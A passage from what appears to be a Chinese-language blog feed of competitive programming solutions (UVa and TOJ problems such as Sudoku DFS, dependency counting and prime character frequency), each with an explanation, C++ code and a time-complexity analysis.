<p>可以用三個陣列分別記錄上面三種情況下每個數字出現的次數，只要出現過就不能再枚舉</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> R, ans, Case=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">9</span>][<span class="number">9</span>], small_sq[<span class="number">9</span>][<span class="number">10</span>], row[<span class="number">9</span>][<span class="number">10</span>], col[<span class="number">9</span>][<span class="number">10</span>], nxt_x[<span class="number">90</span>], nxt_y[<span class="number">90</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先計算三種情況每個數字出現的數量</span></span><br><span class="line"><span class="comment">// 順便先判斷出一開始即不符合的情況</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> res=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">10</span> ; j++)&#123;</span><br><span class="line">			small_sq[i][j] = row[i][j] = col[i][j] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">9</span> ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="comment">// 3*3 方格從左至右、從上至下依序編號 1~9</span></span><br><span class="line">				small_sq[<span class="number">3</span>*(i/<span class="number">3</span>)+(j/<span class="number">3</span>)][arr[i][j]]++;</span><br><span class="line">				row[i][arr[i][j]]++;</span><br><span class="line">				col[j][arr[i][j]]++;</span><br><span class="line">				<span class="keyword">if</span>(small_sq[<span class="number">3</span>*(i/<span class="number">3</span>)+(j/<span class="number">3</span>)][arr[i][j]]&gt;<span class="number">1</span> || row[i][arr[i][j]] &gt; <span class="number">1</span> || col[j][arr[i][j]] &gt; <span class="number">1</span>)</span><br><span class="line">					res=<span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == R)&#123;</span><br><span class="line">		ans++;</span><br><span class="line">		<span class="keyword">if</span>(ans &gt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> i = nxt_x[depth];</span><br><span class="line">	<span class="keyword">int</span> j = nxt_y[depth];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span> ; k&lt;=<span class="number">9</span> ; k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(small_sq[<span class="number">3</span>*(i/<span class="number">3</span>)+(j/<span class="number">3</span>)][k]&gt;<span class="number">0</span> || row[i][k] &gt; <span class="number">0</span> || col[j][k] &gt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		small_sq[<span class="number">3</span>*(i/<span class="number">3</span>)+(j/<span class="number">3</span>)][k]++;</span><br><span class="line">		row[i][k]++;</span><br><span class="line">		col[j][k]++;</span><br><span class="line">		DFS(depth+<span class="number">1</span>);</span><br><span class="line">		small_sq[<span class="number">3</span>*(i/<span class="number">3</span>)+(j/<span class="number">3</span>)][k]--;</span><br><span class="line">		row[i][k]--;</span><br><span class="line">		col[j][k]--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;arr[<span class="number">0</span>][<span class="number">0</span>])&#123;</span><br><span class="line">		<span class="comment">// R 記錄空格子的數量</span></span><br><span class="line">		<span class="comment">// nxt_x, nxt_y 記錄空格的座標</span></span><br><span class="line">		<span class="keyword">if</span>(arr[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>) nxt_x[<span class="number">0</span>]=<span class="number">0</span>, nxt_y[<span class="number">0</span>]=<span class="number">0</span>, R = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> R = <span class="number">0</span>;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">9</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(i==<span class="number">0</span> &amp;&amp; j==<span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">				<span class="keyword">if</span>(arr[i][j] == <span class="number">0</span>) nxt_x[R]=i, nxt_y[R]=j, R++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(check() == <span class="literal">false</span>)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">": Illegal.\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			DFS(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(ans == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">": Unique.\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(ans &gt; <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">": Ambiguous.\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">": Impossible.\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>令 $n = 9$</p>
<p>每筆測資輸入時間複雜度為 $O(n^2)$</p>
<p>每筆測資預處理三種情況時間複雜度為 $O(3n^2)$</p>
<p>DFS 每層最多有 $9$ 種選擇，最多有 $81$ 層</p>
<p>每筆測資 DFS 時間複雜度為 $O(n^{n^2})$</p>
<p>每筆測資總時間複雜度最差為 $O(4n^2 + n^{n^2})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10926</title>
    <url>/2020/06/17/UVa10926/</url>
    <content><![CDATA[<h1 id="UVa10926"><a href="#UVa10926" class="headerlink" title="UVa10926"></a>UVa10926</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10926" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10926</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接對於每個依賴遞迴下去，遇到相同的避掉</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,l;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line">pii ans;</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rec</span><span class="params">(<span class="keyword">int</span> px)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> dep=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(v[px][i]==<span class="number">-1</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//avoid same point occur</span></span><br><span class="line">		<span class="keyword">if</span>(used[v[px][i]])&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			used[v[px][i]]=<span class="literal">true</span>;</span><br><span class="line">			dep += (rec(v[px][i])+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dep;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="comment">//init</span></span><br><span class="line">		ans = make_pair(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">105</span> ; j++)&#123;</span><br><span class="line">				v[i][j]=<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//input</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;k ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;l;</span><br><span class="line">				v[i][j]=l;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//rec every point</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>,tmp ; i&lt;=n ; i++)&#123;</span><br><span class="line">			tmp = rec(i);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">				used[i]=<span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(tmp &gt; ans.first)&#123;</span><br><span class="line">				ans = make_pair(tmp,i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans.second&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次遞迴最多T個依賴都遞迴到</p>
<ul>
<li>初始化<br>  $O(N^2)$</li>
<li>rec<br>  $O(NT)$ 大約等於 $O(N^2)$<br>整體複雜度: $O(N^2)$</li>
</ul>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
        <tag>recursive</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10789</title>
    <url>/2021/03/23/UVa10789/</url>
    <content><![CDATA[<h1 id="UVa-10789"><a href="#UVa-10789" class="headerlink" title="UVa 10789"></a>UVa 10789</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10789" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10789</a></p>
<p>給一串字串 $S$ ，統計每個字元出現的次數，並輸出次數為質數的字元</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先建立質數表，統計過後查表即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">2002</span>;</span><br><span class="line"><span class="keyword">bool</span> prime[MaxN];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">int</span> n,tbl[<span class="number">128</span>];</span><br><span class="line"><span class="built_in">string</span> crt=<span class="string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		prime[i]=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	prime[<span class="number">0</span>] = prime[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(prime[i])&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=i*i ; j&lt;=MaxN ; j+=i)&#123;</span><br><span class="line">				prime[j]=<span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> Case=<span class="number">1</span> ; Case&lt;=n ; Case++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">128</span> ; i++)&#123;</span><br><span class="line">			tbl[i]=<span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			tbl[s[i]]++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;crt.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(prime[tbl[crt[i]]] == <span class="literal">true</span>)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;crt[i];</span><br><span class="line">				out=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!out)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"empty"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h3><p>建表時間複雜度為 $O(NloglogN)$</p>
<p>統計時間複雜度為 $O(len(S))$</p>
<p>總時間複雜度為 $O(NloglogN + len(S))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 529</title>
    <url>/2021/03/23/TOJ529/</url>
    <content><![CDATA[<h1 id="TOJ-529"><a href="#TOJ-529" class="headerlink" title="TOJ 529"></a>TOJ 529</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/529/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/529/</a></p>
<p>輸出 $abs(n-m)$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">if</span>(n-m&lt;<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;-(n-m)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;n-m&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10963</title>
    <url>/2021/03/23/UVa10963/</url>
    <content><![CDATA[<h1 id="UVa-10963"><a href="#UVa-10963" class="headerlink" title="UVa 10963"></a>UVa 10963</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10963" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10963</a></p>
<p>再東西向上有一群南北向的裂縫，對於每群裂縫我們可以把他們南北向任意移動</p>
<p>當所有裂縫的高度都相同時，裂縫就不存在了</p>
<p>現在給你每個裂縫的 $(y_1,y_2)$ ，求是否可以將裂縫補齊</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>題目的意思其實就是因為可以任意移動，只要所有的裂縫高度都相同，那裂縫就能補齊</p>
<p>那麼我們只需要判斷是不是所有的高度都相同即可</p>
<p>拿一個變數去紀錄有出現過的高度，當有裂縫的高度跟他不同時，答案就會是 <code>no</code> ，所有高度都相同時為 <code>yes</code></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">		<span class="keyword">int</span> cnt=<span class="number">-1</span>; <span class="comment">// 紀錄高度</span></span><br><span class="line">		<span class="keyword">bool</span> done=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,x,y ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">			<span class="keyword">if</span>(cnt==<span class="number">-1</span>) cnt=<span class="built_in">abs</span>(x-y);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(cnt!=<span class="built_in">abs</span>(x-y))</span><br><span class="line">				done=<span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(done)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"yes\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"no\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入與計算高度時間複雜度為 $O(m)$</p>
<p>每筆測資總時間複雜度為 $O(m)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11074</title>
    <url>/2021/03/23/UVa11074/</url>
    <content><![CDATA[<h1 id="UVa-11074"><a href="#UVa-11074" class="headerlink" title="UVa 11074"></a>UVa 11074</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11074" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11074</a></p>
<p>依照題目需求輸出圖形</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> s,t,n,l,Case=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;t&gt;&gt;n &amp;&amp; (s!=<span class="number">0</span> &amp;&amp; t!=<span class="number">0</span> &amp;&amp; n!=<span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">":\n"</span>;</span><br><span class="line">		l=s*n+t*(n+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;n ; k++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;t ; i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;l ; j++)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s ; i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> p=<span class="number">0</span> ; p&lt;t ; p++)&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> p=<span class="number">0</span> ; p&lt;s ; p++)&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">'.'</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;t ; j++)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;t ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;l ; j++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每筆測試資料時間複雜度為 $O((s<em>n+t</em>(n+1))^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa108</title>
    <url>/2020/07/02/UVa108/</url>
    <content><![CDATA[<h1 id="UVa108"><a href="#UVa108" class="headerlink" title="UVa108"></a>UVa108</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?108" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?108</a><br>給一個 $n \times n$ 的陣列，求最大的子區域元素和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>枚舉直行的左界右界，從最上列開始往下加，每次更新最大答案<br>在列的部分希望能做到 $O(1)$ 求解<br>可以想到前綴和，將每列的元素與前一個元素相加<br>$sum[i][j] = sum[i][j-1] + arr[i][j]$<br>如此一來當我們想求第 $i$ 列的 $j$～$k$行元素總和<br>$sum[i][k]-sum[i][j-1]$即可得解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">105</span>][<span class="number">105</span>],col[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	